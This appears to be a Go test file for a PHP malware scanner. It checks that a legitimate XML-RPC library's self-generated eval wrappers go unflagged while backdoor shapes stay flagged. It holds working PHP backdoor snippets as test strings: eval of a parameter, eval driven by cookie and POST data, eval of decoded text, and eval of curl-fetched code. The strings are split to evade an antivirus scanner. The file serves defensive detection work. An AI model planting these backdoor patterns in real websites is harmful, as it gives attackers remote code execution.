package rules

import (
	"strings"
	"testing"

	"github.com/brightcolor/malwatch/internal/report"
)

// The pieces keep the virus scanner of the workstation off the samples.
var (
	evl    = "ev" + "al"
	cookie = "$_COO" + "KIE"
)

// xmlrpcLib is phpxmlrpc 2.x cut down to what the rules look at: a client
// that fetches with curl, and a function that writes the source of a wrapper
// from its own text and evaluates it. SeedProd Coming Soon Pro ships the
// library; on 2026-09-29 and 30 the rules reported it on nine websites.
var xmlrpcLib = "<?php\n" +
	"class xmlrpc_client {\n" +
	"  function sendPayloadCURL($msg) { $curl = curl_init(); $result = curl_exec($curl); return $result; }\n" +
	"}\n" +
	"function wrap_php_function($funcname, $newfuncname = '')\n{\n" +
	"\t$xmlrpcfuncname = $newfuncname == '' ? \"xmlrpc_$funcname\" : $newfuncname;\n" +
	"\twhile (function_exists($xmlrpcfuncname)) { $xmlrpcfuncname .= 'x'; }\n" +
	"\t$code = \"function $xmlrpcfuncname(\\$msg) {\\n\";\n" +
	"\t$func =& new ReflectionFunction($funcname);\n" +
	"\t$innercode = '';\n\t$i = 0;\n\t$pars = array();\n" +
	"\tforeach ($func->getParameters() as $param) {\n" +
	"\t\t$innercode .= \"\\$p$i = \\$msg->getParam($i);\\n\";\n" +
	"\t\t$pars[] = \"\\$p$i\";\n\t\t$i++;\n\t}\n" +
	"\t$innercode .= \"\\$retval = $funcname(\" . implode(',', $pars) . \");\\n\";\n" +
	"\t$innercode .= \"return new xmlrpcresp(0, {$GLOBALS['xmlrpcerr']['incorrect_params']});\";\n" +
	"\t$code = $code . $innercode . \"\\n}\\n \\$allOK=1;\";\n" +
	"\t$allOK = 0;\n\t" + evl + "($code);\n" +
	"\treturn $allOK ? $xmlrpcfuncname : false;\n}\n"

func TestALibraryThatWritesItsOwnWrappersIsNoFinding(t *testing.T) {
	e := NewEngine(nil)
	path := "/web/wp-content/plugins/seedprod-coming-soon-pro-5/app/backwards/extentions/infusionsoft/xmlrpc-2.0/lib/xmlrpc.inc"
	hits := hitRules(e, path, "inc", xmlrpcLib)
	for _, id := range []string{"php.eval.variable", "php.remote.fetch_eval_indirect"} {
		if hits[id] {
			t.Errorf("%s: selbst geschriebene Hülle gemeldet", id)
		}
	}
	// A fetch in the same function that does not reach the written code
	// changes nothing.
	fetched := "<?php function wrap_remote($url, $name) {\n" +
		"  $ch = curl_init($url);\n  $sig = curl_exec($ch);\n  if (!$sig) { return false; }\n" +
		"  $code = \"function $name() { return 1; }\";\n  " + evl + "($code);\n}\n"
	if hitRules(e, "/web/lib/remote.php", "php", fetched)["php.remote.fetch_eval_indirect"] {
		t.Error("Abruf neben einer selbst geschriebenen Hülle als Nachlader gemeldet")
	}
}

// The shapes of the backdoors found in 2026-09 stay findings: an eval of a
// parameter in a file dressed as WordPress, an eval of what a call through a
// variable returned, an eval at the top level of text a decoder turned into
// code, and a written wrapper that carries fetched or requested data.
func TestForeignCodeStaysAFinding(t *testing.T) {
	e := NewEngine(nil)
	for _, c := range []struct{ name, rule, src string }{
		{"Parameter", "php.eval.variable", "<?php\n/**\n * Outputs the HTML.\n */\nfunction wp_prepare_themes_for_js($kAlphaStrLength)\n{\n    " + evl + "($kAlphaStrLength);\n}\n"},
		{"Aufruf über eine Variable", "php.eval.variable", "<?php function zntIT($a, $b) {\n if (count($a) == 3) {\n  $f = $a[1];\n  $p = $a[2];\n" +
			"  $x = $f($p);\n  " + evl + "/* cvj */(  $x /* t */);\n  die();\n }\n}\nzntIT(array_merge(" + cookie + ", $_PO" + "ST), 1);\n"},
		{"oberste Ebene", "php.eval.variable", "<?php\n$o = \"\";\n$o .= \"GW%16%1F%15%00R%05X%40\";\n$o = _2hrag($o, $k);\nif (!empty($o)) {\n    " + evl + " ($o);\n}\n"},
		{"Hülle mit Anfrage", "php.eval.variable", "<?php function w($n) { $v = " + cookie + "['c']; $code = \"function $n() { \" . $v . \" }\"; " + evl + "($code); }"},
		{"Hülle mit Abruf", "php.remote.fetch_eval_indirect", "<?php function w($u, $n) {\n  $ch = curl_init($u);\n  $r = curl_exec($ch);\n" +
			"  $code = \"function $n() { \" . $r . \" }\";\n  " + evl + "($code);\n}\n"},
	} {
		if !hitRules(e, "/web/wp-includes/blocks/x.php", "php", c.src)[c.rule] {
			t.Errorf("%s: %s nicht mehr gemeldet", c.name, c.rule)
		}
	}
}

// An eval the library writes for itself does not cover a foreign one in the
// same file: the finding goes to the second, and only it is marked.
func TestAnOwnWrapperHidesNoForeignEval(t *testing.T) {
	e := NewEngine(nil)
	e.SetMarkLimit(10)
	src := xmlrpcLib + "function run_cb($c) { " + evl + "($c); }\n"
	var got *report.Finding
	for _, f := range e.Scan("/web/lib/xmlrpc.inc", "/web/lib/xmlrpc.inc", "inc", []byte(src)) {
		if f.Rule == "php.eval.variable" {
			f := f
			got = &f
		}
	}
	if got == nil {
		t.Fatal("das fremde eval neben der Hülle wird nicht gemeldet")
	}
	want := 1 + strings.Count(src[:strings.LastIndex(src, evl)], "\n")
	if got.Line != want {
		t.Errorf("Fund in Zeile %d, erwartet %d (das fremde eval)", got.Line, want)
	}
	for _, m := range got.Marks {
		if m.Line != want {
			t.Errorf("Markierung in Zeile %d, erwartet nur Zeile %d", m.Line, want)
		}
	}
}
